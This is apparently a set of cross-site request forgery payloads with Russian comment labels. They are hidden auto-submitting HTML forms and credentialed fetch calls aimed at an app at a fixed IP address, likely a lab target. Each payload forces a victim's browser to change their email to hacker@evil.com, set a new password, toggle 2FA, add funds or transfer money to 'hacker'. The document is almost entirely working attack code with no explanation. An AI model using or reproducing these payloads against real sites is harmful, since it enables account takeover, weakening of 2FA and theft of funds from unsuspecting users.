// изменение почты
```html
    <form id="csrf-form" 
          action="http://5.129.245.211:5000/update-profile" 
          method="POST" 
          style="display:none;">
        <input type="text" name="email" value="ayylmao@r.r">
        <input type="text"    name="phone"   value="77777777777">
        <input type="text"    name="address" value="27-я Северная улица, 69">
        <input type="text"    name="bio"     value="coding">
   </form>
    <script>
        fetch('http://localhost:5000/api/update-email', {
            method: 'POST',
            credentials: 'include', 
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                email: 'hacker@evil.com'
            })
        }).catch(() => {});
    </script>
```

// статус
```html
   <form id="csrf-form" 
          action="http://5.129.245.211:5000/update-preferences" 
          method="POST" 
          style="display:none;">
        <input type="text" name="status" value="premium">
    </form
    <script>
        window.onload = function() {
            document.getElementById('csrf-form').submit();
        };
    </script>
```

//пароль
```html
    <form id="csrf-form" 
          action="http://5.129.245.211:5000/change-password" 
          method="POST" 
          style="display:none;">
        <input type="password" name="new_password" value="321">
    </form>
    <script>
        window.onload = function() {
            document.getElementById('csrf-form').submit();
        };
    </script>
```


//2FA
```html
    <form id="csrf-form" 
          action="http://5.129.245.211:5000/toggle-2fa" 
          method="POST" 
          style="display:none;">
    </form>
    <script>
        window.onload = function() {
            document.getElementById('csrf-form').submit();
        };
    </script>

```

//transfer
```html
    <form id="csrf-form" 
          action="http://5.129.245.211:5000/transfer" 
          method="POST" 
          style="display:none;">
        <input type="number" name="amount" value="1">
        <input type="text" name="target_user" value="123">
        <input type="text" name="comment" value="CSRF Attack">
    </form>
    <script>
        window.onload = function() {
            document.getElementById('csrf-form').submit();
        };
    </script>
```

//add money
```html
    <form id="csrf-form" 
          action="http://5.129.245.211:5000/add-funds" 
          method="POST" 
          style="display:none;">
        <input type="number" name="amount" value="1200000">
    </form>
    <script>
        window.onload = function() {
            document.getElementById('csrf-form').submit();
        };
    </script>

```
//api/update-email
```html
<!DOCTYPE html>
<html>
<head>
    <title>CSRF API Update Email</title>
</head>
<body>
    <script>
        fetch('http://5.129.245.211:5000/api/update-email', {
            method: 'POST',
            credentials: 'include',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                email: 'hacker@evil.com'
            })
        }).catch(() => {});
    </script>
</body>
</html>

```
//api/transfer
```html
<!DOCTYPE html>
<html>
<head>
    <title>CSRF API Transfer</title>
</head>
<body>
    <script>
        fetch('http://5.129.245.211:5000/api/transfer', {
            method: 'POST',
            credentials: 'include',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                amount: 5000,
                target_user: 'hacker'
            })
        }).catch(() => {});
    </script>
</body>
</html>
```
